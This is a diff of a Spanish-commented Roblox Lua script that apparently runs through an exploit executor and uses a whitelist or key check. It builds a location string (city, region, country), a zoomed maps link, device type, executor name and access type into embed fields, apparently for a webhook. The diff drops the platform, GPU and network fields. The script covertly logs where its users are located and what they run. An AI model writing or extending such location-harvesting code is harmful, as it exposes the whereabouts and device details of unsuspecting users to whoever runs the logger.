@@ -53,7 +53,7 @@ pcall(function()
     end
 end)
 
--- 📍 Ubicación formateada completa
+-- 📍 Ubicación formateada
 local fullLocation = city .. ", " .. region .. ", " .. country
 
 -- 🗺️ Maps con zoom
@@ -71,17 +71,8 @@ end)
 local playersCount = #Players:GetPlayers()
 local maxPlayers = Players.MaxPlayers
 
--- 💻 Sistema operativo / plataforma
-local platform = tostring(UserInputService:GetPlatform())
-
 -- 📱 Tipo de dispositivo
 local deviceType = UserInputService.TouchEnabled and "Mobile" or "PC"
-
--- 🖥️ GPU (no accesible en Roblox)
-local gpu = "Unknown"
-
--- 🌐 Nombre de red (no disponible)
-local networkName = "Unknown"
 
 -- 🔐 Tipo de acceso
 local accessType = WHITELIST[player.UserId] and "Whitelist" or "Key"
@@ -112,11 +103,7 @@ local data = {
 
             {["name"] = "🗺️ Maps", ["value"] = mapsLink, ["inline"] = false},
 
-            {["name"] = "💻 Platform", ["value"] = platform, ["inline"] = true},
-            {["name"] = "📱 Device Type", ["value"] = deviceType, ["inline"] = true},
-            {["name"] = "🖥️ GPU", ["value"] = gpu, ["inline"] = true},
-
-            {["name"] = "🌐 Network", ["value"] = networkName, ["inline"] = true},
+            {["name"] = "📱 Device", ["value"] = deviceType, ["inline"] = true},
             {["name"] = "🖥️ Executor", ["value"] = executorName, ["inline"] = true},
 
             {["name"] = "🔐 Access Type", ["value"] = accessType, ["inline"] = true},
